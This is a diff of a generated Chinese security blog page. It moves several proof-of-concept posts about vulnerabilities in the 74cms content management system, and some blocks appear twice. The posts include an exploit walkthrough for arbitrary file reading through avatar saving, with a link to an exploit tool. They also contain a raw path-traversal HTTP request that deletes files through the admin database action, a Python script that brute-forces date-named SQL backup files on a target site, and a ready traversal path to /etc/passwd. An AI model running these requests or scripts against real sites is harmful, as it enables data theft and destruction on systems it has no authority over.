-<h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：_save_avatar($avatar, $uid)</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<p>如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar<br>函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二<br>需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：register()</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
-<p>上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
-<p>这里我们讲解一下如果<br>post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
-<p>这里写着 当 $data[utype] = 1<br>会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了</p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
-<h2 id="0x04-漏洞利用小工具"><a href="#0x04-漏洞利用小工具" class="headerlink" title="0x04 漏洞利用小工具"></a>0x04 漏洞利用小工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/74cms-upload">https://github.com/ianxtianxt/74cms-upload</a></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -825,90 +825,6 @@ http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;
 <h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2">https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2</a></p>
 </blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="post-title-link" itemprop="url">74cms v4.2.3 任意文件删除</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:27:57" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
-Host: 0-sec.org
-User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
-Connection: close
-Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
-Upgrade-Insecure-Requests: 1</code></pre>
 
       
     </div>
@@ -1055,121 +971,6 @@ Upgrade-Insecure-Requests: 1</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">74cms v4.2.3 备份文件爆破</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:13" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-<h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code># -*- coding: utf-8 -*-
--------------------------------------------------
-   File Name：     74cms_MysqlBak
-   Description :
-   Author :       CoolCat
-   date：          2019/1/5
--------------------------------------------------
-   Change Activity:
-                   2019/1/5:
--------------------------------------------------
-&quot;&quot;&quot;
-__author__ = &#39;CoolCat&#39;
-
-import requests
-
-def getBak(time):
-    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
-    dir = time + &quot;_1&quot;
-    filename = dir + &quot;_1.sql&quot;
-    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
-    session = requests.Session()
-    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
-               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
-               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
-               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
-    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
-    response = session.get(url=url, headers=headers, cookies=cookies)
-    if response.status_code == 200:
-        print(url)
-        exit()
-
-if __name__ == &#39;__main__&#39;:
-
-    global target
-    target = &quot;http://www.target.com&quot;
-
-    for year in range(2017, 2020):
-        for mouth in range(1, 13):
-            for day in range(1, 31):
-                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
-                getBak(time)</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1251,6 +1052,90 @@ ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
 <p>是读取db.php，如果想读取根目录可以构造</p>
 <p>../../../../../../../../etc/passwd</p>
 <h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="post-title-link" itemprop="url">74cms v4.2.3 任意文件删除</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:27:57" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
+Connection: close
+Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
+Upgrade-Insecure-Requests: 1</code></pre>
 
       
     </div>
@@ -1528,6 +1413,121 @@ Cache-Control: max-age=0</code></pre>
 <h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</a></p>
 </blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">74cms v4.2.3 备份文件爆破</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:13" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+<h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code># -*- coding: utf-8 -*-
+-------------------------------------------------
+   File Name：     74cms_MysqlBak
+   Description :
+   Author :       CoolCat
+   date：          2019/1/5
+-------------------------------------------------
+   Change Activity:
+                   2019/1/5:
+-------------------------------------------------
+&quot;&quot;&quot;
+__author__ = &#39;CoolCat&#39;
+
+import requests
+
+def getBak(time):
+    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
+    dir = time + &quot;_1&quot;
+    filename = dir + &quot;_1.sql&quot;
+    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
+    session = requests.Session()
+    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
+               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
+               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
+    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
+    response = session.get(url=url, headers=headers, cookies=cookies)
+    if response.status_code == 200:
+        print(url)
+        exit()
+
+if __name__ == &#39;__main__&#39;:
+
+    global target
+    target = &quot;http://www.target.com&quot;
+
+    for year in range(2017, 2020):
+        for mouth in range(1, 13):
+            for day in range(1, 31):
+                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
+                getBak(time)</code></pre>
 
       
     </div>
